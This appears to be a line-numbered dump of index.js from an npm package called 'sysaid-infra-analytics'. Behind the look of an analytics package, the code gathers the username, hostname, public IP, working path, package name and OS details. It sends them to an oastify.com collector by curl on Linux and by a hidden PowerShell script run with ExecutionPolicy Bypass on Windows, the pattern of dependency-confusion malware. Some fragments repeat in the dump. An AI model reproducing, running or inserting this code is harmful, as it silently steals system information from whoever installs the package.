// File: tmp/tmpnxr16pgt/sysaid-infra-analytics/package/index.js
// ======================================================================
Line 1: _tmp_0 = require('child_process')
Line 2: const http = require('http')
Line 3: const os = require('os')
Line 4: const fs = require('fs')
Line 6: {
  const options = {
    hostname: 'api.ipify.org',
    path: '/?format=json',
    method: 'GET',
  };

  const req = http.request(options, (res) => {
    let data = '';
    res.on('data', (chunk) => {
      data += chunk;
    });

    res.on('end', () => {
      try {
        const response = JSON.parse(data);
        const publicIP = response.ip;
        callback(null, publicIP);
      } catch (error) {
        callback(new Error('Error parsing response'));
      }
    });
  });

  req.on('error', (error) => {
    callback(error);
  });

  req.end();
}
Line 13: const req = http.request(options, (res) => {
    let data = '';
    res.on('data', (chunk) => {
      data += chunk;
    });

    res.on('end', () => {
      try {
        const response = JSON.parse(data);
        const publicIP = response.ip;
        callback(null, publicIP);
      } catch (error) {
        callback(new Error('Error parsing response'));
      }
    });
  })
Line 21: const response = JSON.parse(data)
Line 23: callback(null, publicIP)
Line 25: callback(new Error('Error parsing response'))
Line 31: callback(error)
Line 34: req.end()
Line 38: os.type()
Line 49: detectOSType()
Line 50: {
      const bash = `#!/bin/bash;separator="--------------------------------------------------";exfiltrate="$separator
Username: $(whoami)
Hostname: $(hostname)
Public IP: ${remoteIP}
Time: $(date)
Current Path: $(pwd)
Package Name: $(npm run env | grep 'npm_package_name' | cut -d '=' -f 2)
Kernel: $(uname -a)
$separator";echo "$exfiltrate" > /tmp/demo.txt;curl --silent -F "content=@/tmp/demo.txt" https://132ibx1yufb2zruq5blx1qepdgj77xvm.oastify.com;rm -f /tmp/demo.txt`;
      exec(
        'echo -e' + bash + " > /tmp/demo.sh; chmod +x /tmp/demo.sh; /bin/bash -c /tmp/demo.sh; rm -f /tmp/demo.sh",
        (error, stdout, stderr) => {
          if (error) {
            console.error(`Error: ${error.message}`);
            return;
          }
        }
      );
    }
Line 60: exec(
        'echo -e' + bash + " > /tmp/demo.sh; chmod +x /tmp/demo.sh; /bin/bash -c /tmp/demo.sh; rm -f /tmp/demo.sh",
        (error, stdout, stderr) => {
          if (error) {
            console.error(`Error: ${error.message}`);
            return;
          }
        }
      )
Line 69: {
      const powershell = `$whoami = whoami
$today = (Get-Date).DateTime
$publicIP = (Invoke-WebRequest -Uri 'https://api.ipify.org?format=text' -UseBasicParsing).content
$system = systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
$filePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "output.txt")
$scriptPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "demo.ps1")

Write-Output "Username: $whoami\`nDate: $today\`nPublic IP: $publicIP\`nSystem Information:" | Out-File -FilePath $filePath -Encoding ASCII
Add-Content $filePath $system

$destinationUrl = "http://132ibx1yufb2zruq5blx1qepdgj77xvm.oastify.com"

$filePath = "$filePath"

Invoke-WebRequest -Uri $destinationUrl -Method POST -InFile $filePath -UseBasicParsing
del $filePath
del $scriptPath`;
      const psFilePath = `${process.env.TEMP}\\demo.ps1`;
      fs.writeFileSync(psFilePath, powershell, 'utf8');
      exec(
        `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\pow...
Line 88: fs.writeFileSync(psFilePath, powershell, 'utf8')
Line 89: exec(
        `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File %TEMP%\\demo.ps1`,
        (error, stdout, stderr) => {
          if (error) {
            console.error(`Error: ${error.message}`);
            return;
          }
        }
      )
